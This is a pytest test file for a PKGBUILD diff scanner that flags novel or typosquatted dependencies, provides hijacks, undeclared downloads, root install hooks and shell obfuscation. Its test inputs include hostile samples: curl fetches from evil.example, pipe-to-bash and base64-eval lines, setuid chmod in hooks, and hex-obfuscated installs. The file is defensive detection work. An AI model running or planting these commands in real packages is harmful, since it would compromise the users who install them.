"""D-series and H015/H016.

Every "must not fire" case here was an observed false positive when the
D001 fire rate was measured against the 3739-diff benign corpus, so they
are regressions rather than hypotheticals.
"""

import copy

import pytest

from trustsight.analysis import scan_diff
from trustsight.config import ensure_default_configs, load_config
from trustsight.db import init_db, record_dependency_names
from trustsight.deps import (
    extract_dependency_changes,
    is_ignorable,
    normalize_dependency,
)
from trustsight.differ import extract_source_array_urls
from trustsight.novelty import typosquat_target
from trustsight.rules import load_rules

HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n"

KNOWN = ["glibc", "curl", "openssl", "cmake", "python-requests", "ffmpeg", "sudo"]


@pytest.fixture(scope="module")
def rules():
    ensure_default_configs()
    return load_rules()


@pytest.fixture
def enabled():
    ensure_default_configs()
    config = copy.deepcopy(load_config())
    config["code_rules"] = {
        r: True for r in ("D001", "D002", "D003", "H015", "H016")
    }
    return config


@pytest.fixture
def disabled():
    ensure_default_configs()
    config = load_config()
    config["code_rules"] = {
        r: False for r in ("D001", "D002", "D003", "D004",
                           "H016", "H017", "H018", "H019")
    }
    return config


def fired(diff, config, rules, package="mypkg"):
    fact = scan_diff(diff, rules=rules, config=config, package_name=package)
    # COVERAGE is not a rule and has no enable switch: it records what the
    # run could not examine, which a disabled ruleset does not change.
    return {e.rule_id for e in fact.score_breakdown if e.rule_id != "COVERAGE"}


# --- normalisation ---

@pytest.mark.parametrize("raw,expected", [
    ("python-requests>=2.0", "python-requests"),
    ("glibc=2.3", "glibc"),
    ("ffmpeg: for video export", "ffmpeg"),
    ("'curl'", "curl"),
    ("libfoo.so=1-64", "libfoo.so"),
])
def test_normalize_dependency(raw, expected):
    assert normalize_dependency(raw) == expected


# --- false positives measured against the benign corpus ---

@pytest.mark.parametrize("name", [
    "$_pkgname",            # linux-cachyos, kwin-effect-rounded-corners-git
    "${pkgbase}",
    "libwlroots-0.21.so",   # mangowm-wlonly-git
])
def test_unresolvable_and_soname_names_are_ignored(name):
    assert is_ignorable(name, "mypkg")


def test_companion_split_package_is_ignored():
    """jellyfin-desktop-git depending on jellyfin-desktop-libcef-bin."""
    assert is_ignorable("jellyfin-desktop-libcef-bin", "jellyfin-desktop-git")


def test_unrelated_name_is_not_ignored():
    assert not is_ignorable("python-granian", "jellyfin-desktop-git")


def test_rewrapping_an_array_adds_nothing():
    """A re-indented array must not read as though every dep were new."""
    diff = HEADER + (
        "-depends=('glibc' 'curl')\n"
        "+depends=(\n+  'glibc'\n+  'curl'\n+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["depends"] == set()


def test_shell_after_an_array_is_not_read_as_dependencies():
    """Measured regression: an unbounded fallback read `if`, `[[`, and `!`
    out of a package() body as dependency names, taking D001 from 0.5% to
    6% of the benign corpus."""
    diff = HEADER + (
        "+optdepends=('firefox: browser')\n"
        "+package() {\n+  if [[ ! -f x ]]; then\n+    echo hi\n+  fi\n+}\n"
    )
    added = extract_dependency_changes(diff, "mypkg")
    # The real optdepend is picked up; the shell body that follows is not.
    assert added["optdepends"] == {"firefox"}
    assert not (added["depends"] | added["makedepends"] | added["checkdepends"])


def test_comments_inside_an_array_are_not_dependencies():
    """Measured regression: maintainers annotate dependency arrays, and every
    word of the note was read as a dependency name ('required', 'because',
    'disabled', 'not')."""
    diff = HEADER + (
        "+makedepends=(\n"
        "+  krisp   # required because the bundled one is disabled\n"
        "+  cmake\n"
        "+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["makedepends"] == {"krisp", "cmake"}


def test_paren_in_a_quoted_description_does_not_end_the_array():
    diff = HEADER + (
        "+optdepends=(\n"
        "+  'foo: (optional) thing'\n"
        "+  'realdep: another'\n"
        "+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["optdepends"] == {"foo", "realdep"}


@pytest.mark.parametrize("token", ["!", "[[", "^[[", "$(", "-"])
def test_shell_fragments_are_not_package_names(token):
    from trustsight.deps import _is_package_name
    assert not _is_package_name(token)


def test_multiline_array_addition_is_found():
    diff = HEADER + " depends=(\n   'glibc'\n+  'newdep'\n )\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {"newdep"}


def test_compound_assignment_is_parsed():
    """`depends+=('x')` is the same declaration appended.

    Requiring a bare `=` made the whole line invisible to every D-rule and
    to the change summary, which is the parser half of the evasion gap.
    """
    diff = HEADER + "+depends+=('evil-pkg' 'evil-pkg2')\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {
        "evil-pkg", "evil-pkg2",
    }


def test_compound_assignment_with_arch_suffix_is_parsed():
    diff = HEADER + "+depends_x86_64+=('evil-pkg')\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {"evil-pkg"}


def test_compound_assignment_appends_to_a_context_array():
    diff = HEADER + " depends=('glibc')\n+depends+=('newdep')\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {"newdep"}


def test_rewrapping_into_a_compound_assignment_adds_nothing():
    diff = HEADER + (
        "-depends=('glibc' 'curl')\n"
        "+depends=('glibc')\n"
        "+depends+=('curl')\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["depends"] == set()


def test_an_open_array_does_not_read_a_second_file():
    """litehtml0.9: a `depends=(` left open in the PKGBUILD hunk was continued
    into the LICENSE and the .patch in the same commit diff, so BSD licence
    words, a git header and CMake tokens were scored as dependencies."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n"
        "+depends=(glibc\n+         gumbo-parser\n"
        "diff --git a/LICENSE b/LICENSE\nnew file mode 100644\n"
        "index 595689f8..ac82b806 100644\n"
        "--- /dev/null\n+++ b/LICENSE\n@@ -0,0 +1,3 @@\n"
        "+Redistribution and use in source and binary forms\n"
        "+permission is hereby granted\n"
        "+merchantability and fitness\n"
        "diff --git a/coinstallability.patch b/coinstallability.patch\n"
        "new file mode 100644\n--- /dev/null\n"
        "+++ b/coinstallability.patch\n@@ -0,0 +1,1 @@\n"
        "+target_include_directories(x PUBLIC y)\n"
    )
    assert extract_dependency_changes(diff, "litehtml")["depends"] == {
        "glibc", "gumbo-parser",
    }


def test_an_array_spanning_two_hunks_keeps_both_additions():
    """A long `depends=(...)` can be changed in two hunks of one file.  The
    file boundary, not the hunk boundary, is where an array ends, so both
    additions survive (dropping the lower one hid a real dependency)."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,5 @@\n"
        " depends=(\n   foo\n   bar\n+  baz\n"
        "@@ -20,4 +21,5 @@\n   qux\n   zzz\n+  newdep\n )\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {
        "baz", "newdep",
    }


def test_dependency_changes_reports_a_compound_assignment(enabled, rules):
    """B7: the change summary sees what the parser sees."""
    diff = HEADER + "+depends+=('evil-pkg')\n"
    fact = scan_diff(diff, rules=rules, config=enabled, package_name="mypkg")
    assert fact.dependency_changes.get("depends") == ["evil-pkg"]


# --- typosquatting ---

@pytest.mark.parametrize("name,target", [
    ("openss1", "openssl"),
    ("cur1", "curl"),
    ("pyhton-requests", "python-requests"),   # transposition
])
def test_typosquat_detected(name, target):
    assert typosquat_target(name, KNOWN + ["python-requests"]) == target


def test_short_names_are_not_typosquat_candidates():
    """`yay` is one edit from yak, yam, jay, and may, all real packages."""
    assert typosquat_target("yak", ["yay"]) is None


def test_unrelated_name_is_not_a_typosquat():
    assert typosquat_target("totally-unrelated-name", KNOWN) is None


# --- H016 source-array scoping ---

def test_source_array_urls_exclude_build_downloads():
    """The whole point of the scoped extractor: a curl URL in build() is
    not a declared source, so it must not appear here."""
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://evil.example/x.sh -o x\n+}\n"
    )
    urls = extract_source_array_urls(diff)
    assert urls == {"https://good.example/a.tar.gz"}


def test_source_compound_assignment_is_a_declared_source():
    """`source+=(url)` declares the URL; H016 must see it as declared."""
    diff = HEADER + "+source+=('https://good.example/a.tar.gz')\n"
    assert extract_source_array_urls(diff) == {"https://good.example/a.tar.gz"}


# --- D001/D002 end to end, against an isolated seeded database ---

@pytest.fixture
def seeded_db(tmp_path, monkeypatch):
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    record_dependency_names(KNOWN * 10)
    yield


def test_d001_fires_on_globally_unknown_dependency(seeded_db, enabled, rules):
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert "D001" in fired(diff, enabled, rules)


def test_d001_silent_on_known_dependencies(seeded_db, enabled, rules):
    diff = HEADER + "-depends=('glibc')\n+depends=('glibc' 'curl')\n"
    assert "D001" not in fired(diff, enabled, rules)


def test_d002_supersedes_d001_for_a_typosquat(seeded_db, enabled, rules):
    """A typosquat is also novel; reporting it as D001 would lose the
    reason it matters."""
    ids = fired(HEADER + "+depends=('glibc' 'openss1')\n", enabled, rules)
    assert "D002" in ids and "D001" not in ids


def test_d001_fires_on_a_compound_assignment_when_warm(seeded_db, enabled, rules):
    diff = HEADER + "+depends+=('totally-unknown-backdoor')\n"
    assert "D001" in fired(diff, enabled, rules)


def test_d002_fires_on_a_compound_assignment_when_warm(seeded_db, enabled, rules):
    ids = fired(HEADER + "+depends+=('openss1')\n", enabled, rules)
    assert "D002" in ids and "D001" not in ids


def test_d001_ignores_the_recipes_own_split_outputs(seeded_db, enabled, rules):
    """linux-versioned-bin: the package depends on the outputs it builds.

    The versioned names are new to the AUR by construction, so a
    --full-recipe run read the summary package's own split outputs as
    novel dependencies (D001) and as a novel set (H030).
    """
    recipe = (
        '_pkg=linux-versioned\n'
        '_versioned="linux1.2.3-1"\n'
        'pkgname=("${_pkg}-bin"\n'
        '         "${_pkg}-headers-bin"\n'
        '         "${_versioned}-bin"\n'
        '         "${_versioned}-headers-bin"\n'
        '         "${_versioned}-docs-bin")\n'
        'package() {\n'
        '  depends=("${_versioned}-bin" "${_versioned}-headers-bin" '
        '"${_versioned}-docs-bin")\n'
        '}\n'
    )
    diff = HEADER + (
        '+_pkg=linux-versioned\n'
        '+_versioned="linux1.2.3-1"\n'
        '+pkgname=("${_pkg}-bin" "${_pkg}-headers-bin" "${_versioned}-bin" '
        '"${_versioned}-headers-bin" "${_versioned}-docs-bin")\n'
        '+package() {\n'
        '+  depends=("${_versioned}-bin" "${_versioned}-headers-bin" '
        '"${_versioned}-docs-bin")\n'
        '+}\n'
    )
    fact = scan_diff(
        diff, rules=rules, config=enabled,
        package_name="linux-versioned-bin", current_text=recipe,
    )
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "D001" not in ids
    assert "H030" not in ids


def test_d001_silent_without_a_seeded_corpus(tmp_path, monkeypatch, enabled, rules):
    """An unseeded database must not make every dependency look novel."""
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert "D001" not in fired(diff, enabled, rules)


# --- end to end ---

def test_rules_are_silent_when_disabled(disabled, rules):
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert fired(diff, disabled, rules) == set()


def test_d003_fires_on_new_network_makedepends(enabled, rules):
    diff = HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
    assert "D003" in fired(diff, enabled, rules)


def test_d003_fires_on_a_compound_assignment(enabled, rules):
    """D003 is not corpus-based, so it proves the parser fix cold."""
    diff = HEADER + "+makedepends+=('git')\n"
    assert "D003" in fired(diff, enabled, rules)


@pytest.mark.parametrize("manager", ["python-pip", "pnpm", "bun", "uv"])
def test_d003_covers_registry_capable_managers(enabled, rules, manager):
    diff = HEADER + f"+makedepends=('{manager}')\n"
    assert "D003" in fired(diff, enabled, rules)


def test_d003_covers_checkdepends(enabled, rules):
    diff = HEADER + "+checkdepends=('npm')\n"
    assert "D003" in fired(diff, enabled, rules)


def test_h016_silent_when_source_is_declared_with_a_compound_assignment(enabled, rules):
    diff = HEADER + (
        "+source+=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://good.example/a.tar.gz -o a\n+}\n"
    )
    assert "H016" not in fired(diff, enabled, rules)


def test_d003_silent_when_network_tool_already_present(enabled, rules):
    diff = HEADER + "-makedepends=('curl')\n+makedepends=('curl' 'cmake')\n"
    assert "D003" not in fired(diff, enabled, rules)


def test_h015_fires_on_build_function_change(enabled, rules):
    diff = HEADER + "+build() {\n+  make\n+}\n"
    assert "H015" in fired(diff, enabled, rules)


def test_h015_silent_on_metadata_only_change(enabled, rules):
    diff = HEADER + "-pkgver=1.0\n+pkgver=1.1\n"
    assert "H015" not in fired(diff, enabled, rules)


def test_h015_fires_on_a_package_change(enabled, rules):
    # package() stays: the kernel-dkms backdoor fixture hides in it, and the
    # calibration recall gate requires H015 to fire there.
    diff = HEADER + (
        "+package() {\n"
        "+  install -Dm644 LICENSE \"$pkgdir/usr/share/licenses/$pkgname/LICENSE\"\n"
        "+}\n"
    )
    assert "H015" in fired(diff, enabled, rules)


def test_h016_fires_on_undeclared_download(enabled, rules):
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://evil.example/x.sh -o x\n+}\n"
    )
    assert "H016" in fired(diff, enabled, rules)


def test_h016_silent_when_url_is_declared(enabled, rules):
    """A legitimate fetch of something already in source=() must not fire."""
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://good.example/a.tar.gz -o a\n+}\n"
    )
    assert "H016" not in fired(diff, enabled, rules)


def test_h015_is_info_and_cannot_move_a_score(rules):
    """It fires on 21.4% of benign diffs, so it must contribute nothing."""
    ensure_default_configs()
    config = load_config()
    diff = HEADER + "+build() {\n+  make\n+}\n"
    fact = scan_diff(diff, rules=rules, config=config, package_name="mypkg")
    entries = {e.rule_id: e for e in fact.score_breakdown}
    assert entries["H015"].severity == "INFO"
    assert entries["H015"].weight == 0
    assert fact.final_score == 0


def test_h015_defaults_on_for_a_config_without_the_section(rules):
    """load_config() never merges defaults into an existing config.toml, so
    the fallback has to live in code or H015 is dead for every upgrade."""
    diff = HEADER + "+build() {\n+  make\n+}\n"
    fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
    assert "H015" in {e.rule_id for e in fact.score_breakdown}


def test_scoring_rules_fire_for_a_config_without_the_section(seeded_db, rules):
    """With empty config the code fallback enables all D-series and H016."""
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
    assert {"D001", "D002", "D003", "H016"} & {e.rule_id for e in fact.score_breakdown}


# --- D004: provides/replaces hijack ---

@pytest.fixture
def all_enabled(enabled):
    enabled["code_rules"].update(
        {"D004": True, "H017": True, "H018": True, "H019": True,
         "H035": True, "H036": True}
    )
    return enabled


def test_d004_fires_on_unrelated_established_package(seeded_db, all_enabled, rules):
    assert "D004" in fired(HEADER + "+provides=('openssl')\n", all_enabled, rules)


def test_d004_fires_on_replaces(seeded_db, all_enabled, rules):
    assert "D004" in fired(HEADER + "+replaces=('sudo')\n", all_enabled, rules)


@pytest.mark.parametrize("pkg,provided", [
    ("htop-vim", "htop"),
    ("lmstudio-bin", "lmstudio"),
    ("localsend-bin", "localsend"),
])
def test_d004_silent_for_a_variant_of_the_same_project(all_enabled, rules, pkg, provided):
    """The ordinary pattern, and every provides/replaces hit in the corpus."""
    diff = HEADER + f"+provides=('{provided}')\n"
    assert "D004" not in fired(diff, all_enabled, rules, package=pkg)


def test_d004_silent_for_a_soname(all_enabled, rules):
    diff = HEADER + "+provides=('libfoo.so=1-64')\n"
    assert "D004" not in fired(diff, all_enabled, rules)


def test_d004_silent_for_a_short_phantom_via_the_fallback(seeded_db, all_enabled,
                                                          rules, monkeypatch):
    """archix-git: ``conflicts=('ax')`` fired D004/H064/H098 on a host
    without pacman data because the observation fallback certified 'ax'
    (24 corpus observations) as an established package - but no package
    named 'ax' exists in the repos or the AUR; the name is an abbreviation
    collision in the corpus.  The fallback now demands a minimum name
    length, and the >= 4-char control at the same count still fires."""
    from trustsight.db import record_dependency_names
    monkeypatch.setattr(
        "trustsight.db.official_package_names", lambda: frozenset())
    record_dependency_names(["ax"] * 24)
    record_dependency_names(["somehelper"] * 10)
    assert "D004" not in fired(
        HEADER + "+conflicts=('ax')\n", all_enabled, rules)
    assert "D004" in fired(
        HEADER + "+provides=('somehelper')\n", all_enabled, rules)


# --- H017: install hooks run as root ---

@pytest.mark.parametrize("body", [
    "chmod u+s /usr/bin/x",
    "systemctl enable --now evil.service",
    "eval \"$payload\"",
])
def test_h017_fires_on_privileged_hook_body(all_enabled, rules, body):
    diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
    assert "H017" in fired(diff, all_enabled, rules)


def test_h017_silent_when_the_match_is_only_a_comment(all_enabled, rules):
    """One of the four corpus hits was `# systemctl enable input-remapper`."""
    diff = HEADER + "+post_install() {\n+  # systemctl enable foo\n+}\n"
    assert "H017" not in fired(diff, all_enabled, rules)


def test_h017_silent_on_a_benign_hook(all_enabled, rules):
    diff = HEADER + "+post_install() {\n+  echo 'run foo to configure'\n+}\n"
    assert "H017" not in fired(diff, all_enabled, rules)


def test_h017_silent_when_a_hook_comment_names_another_function(all_enabled, rules):
    """securelink: `# ...requires a package name...` inside post_install()
    made a genuine `chmod 4755` in package() report as hook work.

    The call graph scanned comments verbatim, so the comment word
    "package" created the edge post_install -> package.
    """
    diff = HEADER + (
        "+post_install() {\n"
        "+  # Upstream's installer requires a package name at /tmp/slp.\n"
        "+  :\n"
        "+}\n"
        "+package() {\n"
        '+  chmod 4755 "$pkgdir/opt/x/chrome-sandbox"\n'
        "+}\n"
    )
    assert "H017" not in fired(diff, all_enabled, rules)


def test_h017_silent_when_the_command_is_printed_in_a_heredoc(all_enabled, rules):
    diff = HEADER + (
        "+post_install() {\n"
        "+  cat <<'MESSAGE'\n"
        "+  chmod 4755 /usr/bin/evil\n"
        "+MESSAGE\n"
        "+}\n"
    )
    assert "H017" not in fired(diff, all_enabled, rules)


# --- H018: patch input from outside the build tree ---

@pytest.mark.parametrize("cmd", [
    "patch -p1 -i /tmp/x.patch",
    "patch -p1 < <(curl https://evil.example/x.patch)",
])
def test_h018_fires_on_untrusted_patch_input(all_enabled, rules, cmd):
    diff = HEADER + f"+prepare() {{\n+  {cmd}\n+}}\n"
    assert "H018" in fired(diff, all_enabled, rules)


def test_h018_silent_for_a_patch_from_srcdir(all_enabled, rules):
    """A patch in $srcdir may have come from the tarball, which is why the
    rule checks where the input comes from rather than whether it is
    declared in source=()."""
    diff = HEADER + '+prepare() {\n+  patch -p1 -i "$srcdir/fix.patch"\n+}\n'
    assert "H018" not in fired(diff, all_enabled, rules)


# --- H019: protocol downgrade ---

def test_h019_fires_on_https_to_http(all_enabled, rules):
    diff = HEADER + (
        "-source=('https://e.example/a.tar.gz')\n"
        "+source=('http://e.example/a.tar.gz')\n"
    )
    assert "H019" in fired(diff, all_enabled, rules)


def test_h019_silent_when_url_was_already_http(all_enabled, rules):
    diff = HEADER + (
        "-source=('http://e.example/a.tar.gz')\n"
        "+source=('http://e.example/b.tar.gz')\n"
    )
    assert "H019" not in fired(diff, all_enabled, rules)


def test_h019_silent_on_an_upgrade_to_https(all_enabled, rules):
    diff = HEADER + (
        "-source=('http://e.example/a.tar.gz')\n"
        "+source=('https://e.example/a.tar.gz')\n"
    )
    assert "H019" not in fired(diff, all_enabled, rules)


# --- H035: foreign package manager in .install ---

@pytest.mark.parametrize("body", [
    "pip install evil",
    "pip3 install evil",
    "npm install evil",
    "cargo install evil",
    "gem install evil",
    "go install evil",
    "dnf install evil",
    "yum install evil",
    "pacman -S evil",
    "apt-get install evil",
    "apt install evil",
    "make install",
])
def test_h035_fires_on_foreign_pkg_manager_in_hook(all_enabled, rules, body):
    diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
    assert "H035" in fired(diff, all_enabled, rules)


def test_h035_silent_in_build_function(all_enabled, rules):
    """Same command in build() is not an install concern."""
    diff = HEADER + "+build() {\n+  pip install evil\n+}\n"
    assert "H035" not in fired(diff, all_enabled, rules)


def test_h035_silent_on_make_install_with_destdir(all_enabled, rules):
    """make install with DESTDIR is a normal packaging step."""
    diff = HEADER + "+post_install() {\n+  make install DESTDIR=/tmp/pkg\n+}\n"
    assert "H035" not in fired(diff, all_enabled, rules)


def test_h035_silent_on_benign_hook(all_enabled, rules):
    diff = HEADER + "+post_install() {\n+  echo nothing\n+}\n"
    assert "H035" not in fired(diff, all_enabled, rules)


def test_h035_silent_when_the_command_is_printed_in_a_heredoc(all_enabled, rules):
    """mixtapes-git: a printed advisory naming `sudo pacman -S` is not a run.

    The heredoc body is a message; only the opener line decides whether it
    is data or a script handed to an interpreter.
    """
    diff = HEADER + (
        "+_check_webkitgtk() {\n"
        "+  cat <<EOF\n"
        "+  >>>     sudo pacman -S extra/webkitgtk-6.0\n"
        "+EOF\n"
        "+}\n"
        "+post_install() { _check_webkitgtk; }\n"
    )
    assert "H035" not in fired(diff, all_enabled, rules)


def test_h035_silent_inside_a_comment(all_enabled, rules):
    diff = HEADER + "+post_install() {\n+  # pip install foo\n+}\n"
    assert "H035" not in fired(diff, all_enabled, rules)


# --- H036: shell obfuscation density ---

def test_h036_fires_on_dense_obfuscation(all_enabled, rules):
    """Line with >=3 obfuscation indicators -> fires."""
    diff = HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'
    assert "H036" in fired(diff, all_enabled, rules)


def test_h036_silent_with_one_indicator(all_enabled, rules):
    """Single obfuscation pattern -> no fire."""
    diff = HEADER + '+build() {\n+  eval "$cmd"\n+}\n'
    assert "H036" not in fired(diff, all_enabled, rules)


def test_h036_silent_with_two_indicators(all_enabled, rules):
    """Two patterns is below the threshold of 3."""
    diff = HEADER + '+build() {\n+  eval `echo $x`\n+}\n'
    assert "H036" not in fired(diff, all_enabled, rules)


def test_h036_fires_with_printf_obfuscation(all_enabled, rules):
    """eval + $() + printf \\x escapes = 3 indicators."""
    diff = HEADER + '+build() {\n+  eval $(printf "\\x68\\x65\\x6c" | bash)\n+}\n'
    assert "H036" in fired(diff, all_enabled, rules)


def test_h036_silent_on_plain_make(all_enabled, rules):
    diff = HEADER + "+build() {\n+  make\n+}\n"
    assert "H036" not in fired(diff, all_enabled, rules)


def test_h036_silent_on_message_line(all_enabled, rules):
    """Obfuscation in an echo/printf message is not executed."""
    diff = HEADER + "+build() {\n+  echo 'eval $(base64)'\n+}\n"
    assert "H036" not in fired(diff, all_enabled, rules)


def test_h036_silent_with_url_shortener_alone(all_enabled, rules):
    """Single short URL is not dense enough."""
    diff = HEADER + '+build() {\n+  curl -s bit.ly/evil | bash\n+}\n'
    assert "H036" not in fired(diff, all_enabled, rules)


def test_h036_fires_with_url_shortener_and_obfuscation(all_enabled, rules):
    """Short URL + pipe to shell + eval = >=3."""
    diff = HEADER + '+build() {\n+  eval $(curl -s bit.ly/evil)\n+}\n'
    assert "H036" in fired(diff, all_enabled, rules)


def test_code_rules_on_by_default_with_load_config(seeded_db, rules):
    """D004, H017, H018, H019, H035, H036 fire when triggered with default config."""
    ensure_default_configs()
    config = load_config()
    for diff in (
        HEADER + "+provides=('openssl')\n",
        HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n",
        HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n",
        HEADER + "-source=('https://e.example/a.tar.gz')\n+source=('http://e.example/a.tar.gz')\n",
        HEADER + "+post_install() {\n+  pip install evil\n+}\n",
        HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n',
    ):
        assert {"D004", "H017", "H018", "H019", "H035", "H036"} & fired(diff, config, rules), diff


def test_legacy_experimental_rules_section_is_still_honored(seeded_db, rules):
    """A config.toml written before the rename must not silently re-enable a
    rule the user disabled, since these rules default to true."""
    ensure_default_configs()
    config = load_config()
    config.pop("code_rules", None)
    config["experimental_rules"] = {"D003": False}
    diff = HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
    assert "D003" not in fired(diff, config, rules)


def test_code_rules_section_wins_over_legacy(seeded_db, rules):
    ensure_default_configs()
    config = load_config()
    config["experimental_rules"] = {"D003": False}
    config["code_rules"] = {"D003": True}
    diff = HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
    assert "D003" in fired(diff, config, rules)


@pytest.mark.parametrize("rule_id,diff", [
    ("D004", HEADER + "+provides=('openssl')\n"),
    ("D002", HEADER + "+depends=('openss1')\n"),
    ("D003", HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"),
    ("H017", HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n"),
    ("H018", HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n"),
    ("H019", HEADER + "-source=('https://e.example/a.tar.gz')\n"
                      "+source=('http://e.example/a.tar.gz')\n"),
    ("H035", HEADER + "+post_install() {\n+  pip install evil\n+}\n"),
    ("H036", HEADER + '+build() {\n+  eval $(base64 -d <<< "$x" | bash)\n+}\n'),
])
def test_each_rule_works_when_enabled_alone(seeded_db, rules, rule_id, diff):
    """D004 shared a guard clause that only tested D001-D003, so enabling it
    on its own silently did nothing."""
    ensure_default_configs()
    config = copy.deepcopy(load_config())
    config["code_rules"] = {rule_id: True}
    assert rule_id in fired(diff, config, rules)


@pytest.mark.parametrize("pkg,provided", [
    ("linux-cachyos", "linux-headers"),      # custom kernel provides headers
    ("mutter-hdr-update", "mutter-devkit"),  # sibling of the same project
])
def test_d004_silent_for_a_sibling_package(all_enabled, rules, pkg, provided):
    """Measured regression: these three were D004's only corpus hits, all
    false positives.  Neither name is a prefix of the other, so relatedness
    also has to accept a shared leading token."""
    diff = HEADER + f"+provides=('{provided}')\n"
    assert "D004" not in fired(diff, all_enabled, rules, package=pkg)


@pytest.mark.parametrize("pkg,provided", [
    ("python-evil", "python-requests"),
    ("ttf-evil", "ttf-liberation"),
    ("r-evil", "r-mass"),
])
def test_d004_still_fires_across_an_ecosystem_prefix(rules, pkg, provided):
    """A shared `python-` says nothing about a common project, so the
    sibling rule must not suppress a hijack inside an ecosystem."""
    from trustsight.deps import is_related_package
    assert not is_related_package(provided, pkg)


# --- H065: obfuscated reconstruction + composition (June-W3 campaign) ---

@pytest.mark.parametrize("body", [
    # June-W3: foreign package manager hidden behind ANSI-C quoting.
    r"b$'\x75\x6e' add nextfile-js",
    r"b$'\x75\x6e'$'\x20'$'\x61\x64\x64' nextfile-js",
    r"b$'\165\156' add nextfile-js",
    r"b''u''n add nextfile-js",
    r"$(printf '\x62\x75\x6e') add nextfile-js",
])
def test_h035_fires_on_reconstructed_foreign_pm_in_hook(all_enabled, rules, body):
    """H035 is position-scoped to install hooks and must fire on the
    *reconstructed* shape: the literal bytes never appear in the diff."""
    diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
    assert "H035" in fired(diff, all_enabled, rules)


def _ansi(word):
    """Encode *word* the June-W3 way: $'\\x68\\x69' -> 'hi'."""
    return "$'" + "".join("\\x%02x" % b for b in word.encode()) + "'"


def test_h035_silent_on_reconstructed_foreign_pm_in_build(all_enabled, rules):
    """Same reconstruction in build() is not an install concern."""
    diff = HEADER + "+build() {\n" + f"+  {_ansi('bun')} add nextfile-js" + "\n}\n"
    assert "H035" not in fired(diff, all_enabled, rules)


def test_h036_composes_high_when_reconstruction_reveals_action(all_enabled, rules):
    """H036 is MEDIUM alone; H036 + reconstruction to an executable action
    (decode-and-pipe) is HIGH."""
    line = f"{_ansi('eval')} $({_ansi('base64')} -d <<< \"$x\" | bash)"
    diff = HEADER + "+build() {\n" + f"+  {line}" + "\n}\n"
    facts = scan_diff(diff, rules=rules, config=all_enabled, package_name="mypkg")
    h036 = [e for e in facts.score_breakdown if e.rule_id == "H036"]
    assert h036 and h036[0].severity == "HIGH"


def test_h036_remains_medium_when_reconstruction_is_inert(all_enabled, rules):
    """Dense obfuscation that reconstructs to nothing executable stays
    MEDIUM, not HIGH."""
    line = f"{_ansi('echo')} hi \"$(printf '\\x62\\x61\\x73\\x65\\x36\\x34' -d <<< 'aGk=')\""
    diff = HEADER + "+build() {\n" + f"+  {line}" + "\n}\n"
    facts = scan_diff(diff, rules=rules, config=all_enabled, package_name="mypkg")
    h036 = [e for e in facts.score_breakdown if e.rule_id == "H036"]
    assert h036 and h036[0].severity == "MEDIUM"



def test_a_source_rename_never_reads_as_a_dependency():
    """nui-sftp: the `makedepends=(` hunk ended before its closer, so the
    next hunk's `source=(` rename entry was read as a makedependency.  A
    `name::url` value is source syntax, not a package name."""
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
        " makedepends=(\n   cmake\n   ninja\n+  clang\n"
        "@@ -20,4 +21,5 @@\n"
        '   "${_cefdirectory}.tar.bz2::https://cef-builds.example/x.tar.bz2"\n'
        "+  extra\n )\n"
    )
    added = extract_dependency_changes(diff, "nui-sftp")
    assert added["makedepends"] == {"clang", "extra"}, added["makedepends"]


# --- hunk-boundary projection vs the authoritative post recipe ---

_BOUNDARY_POST = """pkgname=demo
pkgver=1.0
pkgrel=1
depends=('glibc' 'polkit')
makedepends=('git')
optdepends=(
  'glib2: settings integration'
)
source=(
  'README.md'
  'LICENSE'
  'test_vscode_update.py'
  'test_code_setup.py'
  'create-directory'
)
"""

_BOUNDARY_DIFF = HEADER + """@@ -2,7 +2,7 @@
 pkgname=demo
 pkgver=1.0
 pkgrel=1
-depends=('glibc')
+depends=('glibc' 'polkit')
 makedepends=('git')
 optdepends=(
   'glib2: settings integration'
@@ -20,6 +20,8 @@
   'README.md'
   'LICENSE'
   'test_vscode_update.py'
